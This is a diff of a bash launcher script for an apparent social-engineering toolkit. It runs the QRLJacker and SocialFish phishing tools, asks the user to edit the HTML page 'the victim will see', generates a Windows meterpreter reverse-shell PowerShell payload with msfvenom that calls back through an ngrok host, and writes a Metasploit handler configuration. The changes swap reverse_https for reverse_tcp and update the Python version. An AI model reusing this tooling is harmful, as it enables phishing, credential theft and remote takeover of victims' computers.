@@ -37,6 +37,8 @@ if [[ $menu = 1 ]]; then
     gnome-terminal -e "python QRLJacker.py" &
     sleep 2
     clear
+    gedit index.html &
+    echo "Please edit the Html site, which the victim will see."
     read -p "Press [ENTER] to go back to menu."
     cd ~/set2/
     ./set2.sh
@@ -50,7 +52,7 @@ elif [[ $menu = 2 ]]; then
     ./set2.sh
 elif [[ $menu = 3 ]]; then
     cd ~/set2/tools/SocialFish
-    gnome-terminal -e "python SocialFish.py" &
+    gnome-terminal -e "python3 SocialFish.py" &
     sleep 2
     clear
     echo "\033[1m(DO NOT CLOSE THE SOCIALFISH WINDOW)\033[0m"
@@ -130,7 +132,7 @@ elif [[ $menu = 4 ]]; then
                 echo "" >> output.ps1
                 echo "" >> output.ps1
                 echo "" >> output.ps1
-                msfvenom -p windows/x64/meterpreter/reverse_https LHOST=$ngrokip LPORT=$ngrokport -f powershell -a x64 --platform windows > temp.ps1
+                msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=$ngrokip LPORT=$ngrokport -f powershell -a x64 --platform windows > temp.ps1
                 cat temp.ps1 >> output.ps1     
                 echo "" >> output.ps1
                 echo "" >> output.ps1
@@ -159,7 +161,7 @@ elif [[ $menu = 4 ]]; then
                     rm msf.rc
                     clear
                     echo "use exploit/multi/handler" >> msf.rc
-                    echo "set PAYLOAD windows/x64/meterpreter/reverse_https" >> msf.rc
+                    echo "set PAYLOAD windows/x64/meterpreter/reverse_tcp" >> msf.rc
                     echo "set LHOST $LHOST" >> msf.rc
                     echo "set LPORT $LPORT" >> msf.rc
                     echo "set exitonsession false" >> msf.rc
